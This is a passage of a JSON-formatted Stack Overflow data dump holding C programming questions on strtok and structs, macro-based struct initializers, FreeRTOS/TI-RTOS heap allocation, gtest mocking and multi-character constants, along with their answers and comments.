(fgets(buffer,sizeof(line),stdin) != NULL)\n{\n  char* token = strtok(buffer, \"\\n\"); \n  if (token != NULL)\n  {\n   // in order to get a pointer to the rest of the words you \n   // need to call strtok multiple times and with another \n   // separator since one can assume that there is space between\n   // the words e.g.  char* token = strtok(buffer, \" \\n\"); \n   // and to process all words in the line:\n   // for (char* token = strtok(buffer, \" \\n\";\n   //       token != NULL; \n   //       token = strtok(NULL, \" \\n\"))\n   // {\n   //  .. here you store your tokens\n   // }\n  }\n}\n</code></pre>\n\n<p>to store the tokens you cannot have the struct as you have it\nthe char word[500] is just a character array so indexing in that\narray and having that as a target for your strcpy makes no sense.</p>\n\n<p>instead you need to have an array of structs.</p>\n\n<pre><code>struct words w[200]; // or how many words you are expected to handle\n</code></pre>\n\n<p>now for each word you find you need to look through the array if it\nalready exists, if yes increment counter else copy in word and set\ncounter to 1. You should initialize the array to make sure it is set to 0. Keep track of how many words you have in your array e.g. <code>wordsFound</code></p>\n\n<pre><code>int wordsFound = 0;\nfor (char* token = strtok(buffer, \" \\n\"; token != NULL; token = strtok(NULL, \" \\n\"))\n{\n  ...\n}\n</code></pre>\n\n<p>A final note: strtok modifies the argument that is passed to it, so you cannot store the pointer that is returned. Either you need to copy it as above or you need to allocate space and then copy to it.</p>\n\n<p>Normally one would not have an array of words but instead for instance a linked list of words which grows whenever a new word is found, of course this example can be expanded on to have better lookup etc but I guess that is not your goal for now.</p>\n"}], "owner": {"reputation": 7, "user_id": 8993845, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5q3zP.jpg?s=128&g=1", "display_name": "E.Bille", "link": "https://stackoverflow.com/users/8993845/e-bille"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 743, "favorite_count": 0, "accepted_answer_id": 48668628, "answer_count": 2, "score": 0, "last_activity_date": 1518020697, "creation_date": 1518019435, "question_id": 48668223, "link": "https://stackoverflow.com/questions/48668223/storing-tokens-in-struct", "title": "Storing tokens in struct", "body": "<p>Sorry for the duplicate question, but I'm very new to C programming and can't wrap my head around how to implement previous answers on the same toping into my own code.</p>\n\n<p>I am to read in text from either a file on disk or stdin, sort the words and then present the user with a list of word occurrence (the most occurring word at the top and then in falling order).</p>\n\n<p>I'm currently stuck with storing my tokenised word it a suitable way to later be able to count and sort them. I've decided to go with a struct.</p>\n\n<p>I've written a test-file where I use fgets from stdin to feed it with data.</p>\n\n<p>This is the code:</p>\n\n<pre><code> #include &lt;stdio.h&gt;\n #include &lt;stdlib.h&gt;\n #include &lt;string.h&gt;\n\nint main(int argc, char const *argv[])\n{\n    struct words\n    {\n        char word[500];\n        unsigned int count;\n    };\n\n    int size = 500;\n    char *buffer;\n    char token;\n    struct words w;\n\n    #ifdef DEBUG\n    printf(\"--!DEBUG INFO!-- \\n Right before the 4-loop now\\n--!DEBUG INFO!--\\n\");\n    #endif\n    for (int i = 0; i &lt; 10; ++i)\n    {\n        printf(\"Please enter word\\n\");\n        fgets(buffer, size, stdin);\n        #ifdef DEBUG\n        printf(\"--!DEBUG INFO!-- \\n %c\\n--!DEBUG INFO!--\\n\", buffer);\n        #endif\n        token = strtok(buffer[i], \"\\n\");\n        strcpy(w.word[i], token);\n        #ifdef DEBUG\n        printf(\"--!DEBUG INFO!-- \\n %c\\n--!DEBUG INFO!--\\n\", w.word[i]);\n        #endif\n    }\n\n    for (int i = 0; i &lt; 10; ++i)\n    {\n        printf(\"%c\\n\", w.word[i]);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>When compiling I get a whole bunch of warning messages, most of them stating something similar to this:</p>\n\n<pre><code>incompatible pointer to integer conversion assigning to 'char' from\n      'char *'; dereference with * [-Wint-conversion]\n                token = strtok(buffer[i], \"\\n\");\n</code></pre>\n\n<p>The program does however compile, and run until I give it data and hit enter. After that, it crashes with a Segmentation fault: 11 message</p>\n\n<pre><code>./tok_struct \n--!DEBUG INFO!-- \n Right before the 4-loop now\n--!DEBUG INFO!--\nPlease enter word\nTest \nSegmentation fault: 11\n</code></pre>\n\n<p>I'm very grateful for any help can get! </p>\n"}, {"tags": ["c", "arrays", "macros", "c-preprocessor"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1518020762, "post_id": 48668077, "comment_id": 84335077, "body": "I&#39;d contact them and ask them why the obfuscate their code to oblivion... A plain list of designated initializers would be far more readable than this macro mess."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1518020867, "post_id": 48668077, "comment_id": 84335147, "body": "If you tweak their icky macro to be <code>#define NRF_TWI_MNGR_TRANSFER(_operation, _p_data, _length, _flags) (nrf_twi_mngr_transfer_t) { ...</code> does that solve the problem?"}], "answers": [{"tags": [], "owner": {"reputation": 147719, "user_id": 817643, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/3ec3655af26685ce29823b04cb6c78d5?s=128&d=identicon&r=PG", "display_name": "StoryTeller - Unslander Monica", "link": "https://stackoverflow.com/users/817643/storyteller-unslander-monica"}, "is_accepted": true, "score": 1, "last_activity_date": 1518019476, "creation_date": 1518019476, "answer_id": 48668237, "question_id": 48668077, "link": "https://stackoverflow.com/questions/48668077/use-of-macros-in-array-definition-in-c/48668237#48668237", "title": "Use of macros in array definition in C", "body": "<p>Ultimately, the macro expands into a brace enclosed initializer. Such a thing is not an expression, so it cannot be used as the right hand side of plain assignment (assignment and initialization are different things). It will work as part of a larger initializer, but not the way you try to use it unmodified.</p>\n\n<p>But all is not lost. The syntax of the initializer implies <a href=\"/questions/tagged/c99\" class=\"post-tag\" title=\"show questions tagged &#39;c99&#39;\" rel=\"tag\">c99</a> support. So we can use a trick. Structure objects can be assigned to eachother. So we need only obtain an object from somewhere. We can use a <a href=\"http://en.cppreference.com/w/c/language/compound_literal\" rel=\"nofollow noreferrer\">compound literal</a> in order to create said object:</p>\n\n<pre><code>transfers_1[0] = (nrf_twi_mngr_transfer_t)NRF_TWI_MNGR_WRITE(/*Your arguments*/);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 387, "user_id": 3227830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/935376e1d436d541981377474a2524e2?s=128&d=identicon&r=PG&f=1", "display_name": "bgarrood", "link": "https://stackoverflow.com/users/3227830/bgarrood"}, "edited": false, "score": 0, "creation_date": 1518025126, "post_id": 48668293, "comment_id": 84337851, "body": "Boom!  Great answer, easy to understand.  Both of my problems disappear using your &quot;cast&quot; (not sure what else to call it.   Thank you!!"}], "tags": [], "owner": {"reputation": 106086, "user_id": 15809, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/2ULwK.jpg?s=128&g=1", "display_name": "Mecki", "link": "https://stackoverflow.com/users/15809/mecki"}, "is_accepted": false, "score": 1, "last_activity_date": 1518020114, "last_edit_date": 1518020114, "creation_date": 1518019633, "answer_id": 48668293, "question_id": 48668077, "link": "https://stackoverflow.com/questions/48668077/use-of-macros-in-array-definition-in-c/48668293#48668293", "title": "Use of macros in array definition in C", "body": "<p>If you define the value of a structure the moment you declare it, the compiler will infer the type of the structure from the declaration. So this here will compile:</p>\n\n<pre><code>struct coordinates {\n  int x;\n  int y;\n};\n\nstruct coordinates origin = { 10, 20 }; // This is OK\n</code></pre>\n\n<p>But if you assign a value to a previously declared variable, the compiler cannot infer its type. This code won't compile:</p>\n\n<pre><code>struct coordinates origin;\norigin = { 10, 20 }; // ERROR! The type of the rvalue is unknown!\n</code></pre>\n\n<p>The type is unknown, because two structures are not equivalent in C just because they have the same members. E.g. this is legal in C:</p>\n\n<pre><code>struct coordinates {\n  int x;\n  int y;\n};\n\nstruct dayOfYear {\n  int day;\n  int month;\n};\n</code></pre>\n\n<p>Now what would <code>{ 5, 8 }</code> be? The coordinates (5/8) or the 5th of August? It could be both. All that he compiler knows is that it is a struct of type <code>{ int, int }</code>. Yet this does not define a type in C. The following is possible in some languages but it's not possible in C:</p>\n\n<pre><code>struct dayOfYear date = { 2, 3 };\nstruct coordinates cords = date; // ERROR!\n</code></pre>\n\n<p>Despite the fact that both structures are of type <code>{ int, int }</code>, for the compiler <code>struct dayOfYear</code> and <code>struct coordinates</code> are two completely distinct and unrelated data types.</p>\n\n<p>If you want to declare a hardcoded struct value, you need to tell the compiler what kind of struct that is:</p>\n\n<pre><code>struct coordinates origin;\norigin = (struct coordinates){ 10, 20 }; // This is OK\n</code></pre>\n\n<p>Your <code>NRF_TWI_MNGR_TRANSFER</code> defines a hardcoded struct but only when you use that in a definition the compiler knows the type. If you try to use it as an assignment, you need to cast to the correct type.</p>\n\n<pre><code>transfers_1[0] = (nrf_twi_mngr_transfer_t)NRF_TWI_MNGR_WRITE(MSBARO5X_0_ADDR , &amp;reg_addr[1], 1, NRF_TWI_MNGR_NO_STOP);\n</code></pre>\n\n<p>Which is not really a cast, even though it has the same syntax. In fact this is just telling the compiler how to interpret the following data.</p>\n"}], "owner": {"reputation": 387, "user_id": 3227830, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/935376e1d436d541981377474a2524e2?s=128&d=identicon&r=PG&f=1", "display_name": "bgarrood", "link": "https://stackoverflow.com/users/3227830/bgarrood"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1727, "favorite_count": 0, "accepted_answer_id": 48668237, "answer_count": 2, "score": 1, "last_activity_date": 1518020114, "creation_date": 1518019003, "question_id": 48668077, "link": "https://stackoverflow.com/questions/48668077/use-of-macros-in-array-definition-in-c", "title": "Use of macros in array definition in C", "body": "<p>I am new to C and using it to program a Nordic nrf52 chip.  I believe my problem is a general C one though rather than application.</p>\n\n<p>I am setting up an array of structs using macros predefined in the chip SDK.  Using those macros in the array initialisation works, but doing element by element does not.<br>\nSo, the following works:</p>\n\n<pre><code>nrf_twi_mngr_transfer_t transfers_1[2] = { \\\n                                    NRF_TWI_MNGR_WRITE(MSBARO5X_0_ADDR , &amp;reg_addr[1], 1, NRF_TWI_MNGR_NO_STOP), \\\n                                    NRF_TWI_MNGR_READ (MSBARO5X_0_ADDR , &amp;p_buffer[0], sizeof(p_buffer), 0)\n                            };      \n</code></pre>\n\n<p>Where: </p>\n\n<pre><code>typedef struct {\n    uint8_t * p_data;     ///&lt; Pointer to the buffer holding the data.\n    uint8_t   length;     ///&lt; Number of bytes to transfer.\n    uint8_t   operation;  ///&lt; Device address combined with transfer direction.\n    uint8_t   flags;      ///&lt; Transfer flags (see @ref NRF_TWI_MNGR_NO_STOP).\n} nrf_twi_mngr_transfer_t;\n</code></pre>\n\n<p>NRF_TWI_WRITE and _READ are macros that use further macros, for example:</p>\n\n<pre><code>#define NRF_TWI_MNGR_WRITE(address, p_data, length, flags) \\\n    NRF_TWI_MNGR_TRANSFER(NRF_TWI_MNGR_WRITE_OP(address), p_data, length, flags)\n</code></pre>\n\n<p>which uses</p>\n\n<pre><code>#define NRF_TWI_MNGR_WRITE_OP(address)      (((address) &lt;&lt; 1) | 0)\n</code></pre>\n\n<p>and</p>\n\n<pre><code>#define NRF_TWI_MNGR_TRANSFER(_operation, _p_data, _length, _flags) \\\n{                                      \\\n    .p_data    = (uint8_t *)(_p_data), \\\n    .length    = _length,              \\\n    .operation = _operation,           \\\n    .flags     = _flags                \\\n}\n</code></pre>\n\n<p>What I want to do is change individual items in this array, for example:</p>\n\n<pre><code>transfers_1[0] = NRF_TWI_MNGR_WRITE(MSBARO5X_0_ADDR , &amp;reg_addr[1], 1, NRF_TWI_MNGR_NO_STOP);\n</code></pre>\n\n<p>However when I do that, I get the error \"expected an expression\".</p>\n\n<p>MSBARO5X_0_ADDR is also defined in a define statement:\n    #define MSBARO5X_0_ADDR         0x76</p>\n\n<p>If I replace this in any of the above code with a variable, I get the same \"expected an expression\" error.  I suspect the two problems I have are due to the same lack of understanding on my part.  SO forgive me for combining the two in a single post.</p>\n\n<p>So the questions are:\n-Why am I getting this error?\n-Is it possible to change individual items in my array, and if so how?\n-Is it possible to use a variable in place of the MSBARO5X_ADDR, and if so how?</p>\n\n<p>Many thanks!</p>\n"}, {"tags": ["c", "freertos"], "comments": [{"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 1, "creation_date": 1518020273, "post_id": 48667995, "comment_id": 84334749, "body": "FreeRTOS malloc implementation is very light-weight and you don&#39;t need to do one step more."}, {"owner": {"reputation": 606, "user_id": 1864036, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/PnVHS.jpg?s=128&g=1", "display_name": "starturtle", "link": "https://stackoverflow.com/users/1864036/starturtle"}, "reply_to_user": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1518090000, "post_id": 48667995, "comment_id": 84366335, "body": "@tilz0R That&#39;s what I thought, but something seems to go wrong. Is there any way to mess up linkage such that the heap implementation&#39;s free block addresses may end up on the wrong thread stack, allowing for double use?"}, {"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1518090105, "post_id": 48667995, "comment_id": 84366401, "body": "This happened only if you used your mamory wrong. Did you write memory outside your area? So, allocate 5 bytes and write up to 10bytes? Then you do corruption!"}, {"owner": {"reputation": 606, "user_id": 1864036, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/PnVHS.jpg?s=128&g=1", "display_name": "starturtle", "link": "https://stackoverflow.com/users/1864036/starturtle"}, "reply_to_user": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1518090544, "post_id": 48667995, "comment_id": 84366710, "body": "@tilz0R That&#39;s understood. Sadly, that can only be the case if TI-RTOS doesn&#39;t get its sizeofs right - see the example. I&#39;ll update the question with an example of the sizeof issue I&#39;ve come across earlier. Maybe they can have the same root cause."}, {"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1518090634, "post_id": 48667995, "comment_id": 84366780, "body": "No! Malloc works ok, it aligns data automaticaly to (usually) 4 bytes. Implementation is not a problem, you usage is."}, {"owner": {"reputation": 606, "user_id": 1864036, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/PnVHS.jpg?s=128&g=1", "display_name": "starturtle", "link": "https://stackoverflow.com/users/1864036/starturtle"}, "reply_to_user": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1518090984, "post_id": 48667995, "comment_id": 84366988, "body": "@tilz0R I know. That&#39;s why I would like to know what NOT to do (other than allocate less than needed, forget to free something after use or free the first chunk ever allocated - attempting to do so corrupts the heap4 version I&#39;m using). Both allocations are successful, the breakpoint at <code>free</code> never triggers, but the allocated areas overlap."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518092051, "post_id": 48667995, "comment_id": 84367693, "body": "<code>static pthread_mutex_t myMutex = NULL;</code> compiles without warning?"}, {"owner": {"reputation": 606, "user_id": 1864036, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/PnVHS.jpg?s=128&g=1", "display_name": "starturtle", "link": "https://stackoverflow.com/users/1864036/starturtle"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518093739, "post_id": 48667995, "comment_id": 84368916, "body": "@AndrewHenle <code>pthread_mutex_t</code> resolves to a fallback handle type of <code>void *</code>, so yes. Also, <code>pthread_mutex_init(pthread_mutex_t *p_mutex)</code> contains the assignment <code>*p_mutex = pvPortMalloc(...)</code>.  <code>pthread_cond_init</code>, however, will dereference the parameter given, so the value must be given as a struct (<code>pthread_cond_t myCondition = { NULL };</code>is cool, though). The implementation is taken from SDK 1.60."}, {"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1518093845, "post_id": 48667995, "comment_id": 84368972, "body": "@starturtle Implementation is ok and works ok. Period. End of story. Problem is your usage of memory returned by malloc. Period. End of story."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518094541, "post_id": 48667995, "comment_id": 84369413, "body": "@starturtle Well, that would explain the lack of <code>PTHREAD_MUTEX_INITIALZER</code> in TI-RTOS - it&#39;s impossible to statically initialize a mutex if the underlying implementation of <code>pthread_mutex_t</code> is <code>void *</code>.  One way to check if your problem really is a broke <code>sizeof()</code> is to replace <code>MyStruct *p_myBuffer = malloc(sizeof(MyStruct));</code> with <code>MyStruct *p_myBuffer = malloc(0x58);</code> or even <code>MyStruct *p_myBuffer = malloc(0x100);</code>.  If your problems disappear with the use of <code>malloc(0x58)</code>, that&#39;s pretty strong evidence that you&#39;re dealing with a buggy <code>sizeof()</code>, assuming that <code>0x58</code> size is accurate."}], "owner": {"reputation": 606, "user_id": 1864036, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/PnVHS.jpg?s=128&g=1", "display_name": "starturtle", "link": "https://stackoverflow.com/users/1864036/starturtle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 851, "favorite_count": 1, "answer_count": 0, "score": 0, "last_activity_date": 1518090729, "creation_date": 1518018785, "last_edit_date": 1518090729, "question_id": 48667995, "link": "https://stackoverflow.com/questions/48667995/pvportmalloc-in-multithreaded-application", "title": "pvPortMalloc in multithreaded application", "body": "<p>I'm running an application with several threads in TI-RTOS with CCS7.2, using their implementation of <code>pthread</code> <code>mutex</code>, <code>condition</code> and <code>thread</code>. \nThey all use <code>pvPortMalloc</code> to allocate memory dynamically. </p>\n\n<p>To keep my threads small, I'm dynamically allocating the larger memory chunks my threads are using with their <code>malloc</code> implementation, yet another wrapper around <code>pvPortMalloc</code>. </p>\n\n<p>Among others, there are these two allocations:</p>\n\n<pre><code>/* thread A ***************************/\n#define CONST_ARRAY_SIZE 4\ntypedef struct {\n    uint16_t var1;\n    uint8_t var2;\n    uint32_t var3[CONST_ARRAY_SIZE];\n    /* ... */\n    /* sizeof(MyStruct) == 0x58 according to debugger */\n} MyStruct;\nMyStruct *p_myBuffer = malloc(sizeof(MyStruct)); // p_myBuffer = ucHeap + 0x40D0\n/* thread B ***************************/\nstatic pthread_mutex_t myMutex = NULL;\npthread_mutex_init(&amp;myMutex); // myMutex = ucHeap + 0x4118 - why is this allowed?\n</code></pre>\n\n<p>The problem is obvious: as soon as <code>p_myBuffer</code> gets initialized, the properties in <code>myMutex</code> are overwritten. On the first <code>pthread_mutex_lock</code>, the mutex runs into <code>configASSERT</code> because the mutex's semaphore has become invalid. </p>\n\n<p>Is there anything that can make <code>pvPortMalloc</code> \"forget\" some memory is still in use or forget about chunk sizes? <strong>I wonder why the system allows allocation of mutex memory at that heap address and treats an address between <code>ucHeap + 0x40D0</code> and <code>ucHeap + 0x4128</code> as available.</strong></p>\n\n<p>Is the heap management misinterpreting the array member and doesn't count all elements' sizes, but rather some pointer size? I've come across some strange interpretations of variables' <code>sizeof</code> with this toolchain.</p>\n\n<p>From what I know about dynamic allocation, any buffer allocated from heap (I'm using heap4) should persist and remain blocked for further allocations across all threads. Those don't seem to do so - is there any way a heap-allocated memory block can silently go out of scope and get <code>free</code>d? I've debugged to the point where I can rule out an explicit <code>free</code>. </p>\n\n<p>A possibly related issue I've come across was that sometimes sizeof doesn't work right: </p>\n\n<pre><code>uint8_t integerSize = sizeof(uint32_t); // integerSize yields 4\nuint32_t sampleInteger;\nintegerSize = sizeof(sampleInteger); // integerSize yields 1\n</code></pre>\n\n<p>I'm not sure which POD type actually caused this behavior, but I remember it broke some buffer allocations, and it wasn't the usual array/pointer issue. Is there anything in particular that may cause this? Can the two issues be related? After all, if <code>sizeof</code> returns something too small, the malloc may cause a buffer overflow on full initialization.</p>\n"}, {"tags": ["c++", "c", "unit-testing", "googletest", "gmock"], "comments": [{"owner": {"reputation": 171938, "user_id": 2684539, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c5fff6fb65e95570ad1a90fe1e3522e?s=128&d=identicon&r=PG&f=1", "display_name": "Jarod42", "link": "https://stackoverflow.com/users/2684539/jarod42"}, "edited": false, "score": 2, "creation_date": 1518018460, "post_id": 48667817, "comment_id": 84333475, "body": "Split your initialization in sub functions and mock only the one you want ?"}, {"owner": {"reputation": 578, "user_id": 5945089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dc6a32dbdb795aea85f857496071b00f?s=128&d=identicon&r=PG&f=1", "display_name": "Gregory Prescott", "link": "https://stackoverflow.com/users/5945089/gregory-prescott"}, "edited": false, "score": 0, "creation_date": 1518678999, "post_id": 48667817, "comment_id": 84606025, "body": "Care to share some code samples of what exactly are you trying to achieve?"}], "owner": {"reputation": 11, "user_id": 4396467, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b62bed399e2f247951854ce21dfac9b5?s=128&d=identicon&r=PG&f=1", "display_name": "kreso", "link": "https://stackoverflow.com/users/4396467/kreso"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 467, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518871449, "creation_date": 1518018235, "last_edit_date": 1518871449, "question_id": 48667817, "link": "https://stackoverflow.com/questions/48667817/mocking-only-one-variable-inside-function-with-gtest", "title": "Mocking only one variable inside function with gtest", "body": "<p>I'm coding in C and using gtest for C++ for unit testing.</p>\n\n<p>I'd like to test situation where some variable gets integer overflow but incrementing that variable takes too long in UT. This variable is counter being written to directly only during initialization and is incremented on some events. My idea is to mock the counter to the maximum integer value during initialization, but I don't want to mock the function where counter is initialized because various other data important for UT is initialized in this function.</p>\n\n<p>Is something like this possible with gtest or do I need to implement a stub which will have all the functionalities of real function and initialize wanted counter value to counter?</p>\n\n<p>I cannot share the code since it's copyrighted, but here is excerpt showing general idea:</p>\n\n<pre><code>typedef struct {\n    some_variable;\n    another_variable;\n    counter;\n} data_structure_defined_only_in_this_file;\n\n...\n\n// check_some_parameters() isn't exported in header files\nvoid check_some_parameters(data_structure_defined_only_in_this_file *container) {\n    if (something == true)\n        container-&gt;counter++;\n}\n\n...\n\n// initialization() isn't exported in header files\nvoid initialization() {\n    data_structure_defined_only_in_this_file *container;\n    ...\n    container = (struct data_structure_defined... *)calloc(1, sizeof(struct data_structure_defined...));\n}\n</code></pre>\n\n<p>I made another function during initialization after allocating memory to container. This function returned value which was assigned to counter as initial value.</p>\n\n<p>source_file.c</p>\n\n<pre><code>// init_counter_val() IS exported to header file included in UT\nint init_counter_val() { return 0; }\n\nvoid initialization() {\n    data_structure_defined_only_in_this_file *container;\n    ...\n    container = (struct data_structure_defined... *)calloc(1, sizeof(struct data_structure_defined...));\n    container-&gt;counter = init_counter_val();\n}\n</code></pre>\n\n<p>unit_test.cc</p>\n\n<pre><code>...\nON_CALL(mockObj, init_counter_val()).WillByDefault(Return(INT_MAX));\n...\n</code></pre>\n\n<p>I mocked that function for unit test to return max integer value on function call but that solution wasn't accepted since production code would be changed to enable unit testing. But since neither data structure type nor functions where counter is written to aren't exported from source file, I believe mocking is impossible.</p>\n"}, {"tags": ["c", "printf", "character", "literals"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1518017604, "post_id": 48667552, "comment_id": 84332807, "body": "First fix the warnings I am sure you are getting. Then come back."}, {"owner": {"reputation": 353, "user_id": 9090821, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KgpAu.jpg?s=128&g=1", "display_name": "MemAllox", "link": "https://stackoverflow.com/users/9090821/memallox"}, "edited": false, "score": 0, "creation_date": 1518017752, "post_id": 48667552, "comment_id": 84332911, "body": "<code>char c = &#39;012&#39;</code> is wrong here. Do you want to use a char (one number/letter) or a char array (multiple numbers/letters)?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "edited": false, "score": 0, "creation_date": 1518018030, "post_id": 48667552, "comment_id": 84333104, "body": "@machine_1 The question was migrated. The comment is from CS SE"}, {"owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518018135, "post_id": 48667552, "comment_id": 84333197, "body": "@eugene ahh, I did not know that comments are migrated also."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 353, "user_id": 9090821, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KgpAu.jpg?s=128&g=1", "display_name": "MemAllox", "link": "https://stackoverflow.com/users/9090821/memallox"}, "edited": false, "score": 0, "creation_date": 1518018519, "post_id": 48667552, "comment_id": 84333513, "body": "@MemAllox, the statement you point out is unlikely to be what is <i>intended</i>, but it is not wrong in the sense of being invalid."}, {"owner": {"reputation": 353, "user_id": 9090821, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KgpAu.jpg?s=128&g=1", "display_name": "MemAllox", "link": "https://stackoverflow.com/users/9090821/memallox"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518019521, "post_id": 48667552, "comment_id": 84334206, "body": "@JohnBollinger Yes, you are right! Wikipedia: <i>Multi-character constants (e.g. &#39;xy&#39;) are valid, although rarely useful \u2014 they let one store several characters in an integer (e.g. 4 ASCII characters can fit in a 32-bit integer, 8 in a 64-bit one). Since the order in which the characters are packed into one int is not specified, portable use of multi-character constants is difficult.</i> I didn&#39;t know that. Thanks!"}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "reply_to_user": {"reputation": 353, "user_id": 9090821, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KgpAu.jpg?s=128&g=1", "display_name": 